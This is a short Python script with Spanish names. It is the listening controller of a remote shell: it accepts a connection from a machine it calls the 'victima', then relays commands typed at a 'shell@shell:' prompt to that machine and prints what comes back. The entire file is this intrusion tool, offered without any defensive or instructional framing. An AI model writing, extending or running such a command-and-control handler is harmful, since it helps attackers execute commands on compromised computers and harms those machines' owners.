import socket

def main():
    server = socket.socket()
    server.bind(('localhost',7777))
    server.listen(1)

    while True:
        victima,direccion = server.accept()
        print('Coneccion de: {}'.format(direccion))
        
        ver = victima.recv(1024)

        if ver == "1":
            while True:
                opcion = input("shell@shell: ")
                victima.send(opcion)
                resultado = victima.recv(2048)
                print(resultado)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n saliendo")
        exit()